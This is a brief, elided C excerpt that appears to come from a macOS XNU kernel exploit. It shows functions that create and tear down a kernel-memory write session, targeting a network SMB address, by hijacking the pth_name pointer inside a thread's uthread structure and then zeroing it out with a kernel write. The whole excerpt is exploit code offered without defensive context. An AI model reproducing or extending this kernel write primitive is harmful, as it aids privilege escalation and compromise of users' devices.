...
kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_addr) {
    ...
    xe_assert_cond(write_end, <=, thread + TYPE_THREAD_SIZE + TYPE_UTHREAD_SIZE);
    xe_assert_cond(write_start, <=, pth_name);
    xe_assert_cond(pth_name + sizeof(uintptr_t), <=, write_end);
...
void kmem_write_session_destroy(kmem_write_session_t* session_p) {
    uintptr_t thread = xe_xnu_thread_current_thread();
    uintptr_t uthread = thread + TYPE_THREAD_SIZE;
    xe_kmem_write_uint64(uthread, TYPE_UTHREAD_MEM_PTH_NAME_OFFSET, 0);
    free(*session_p);
    *session_p = NULL;
}
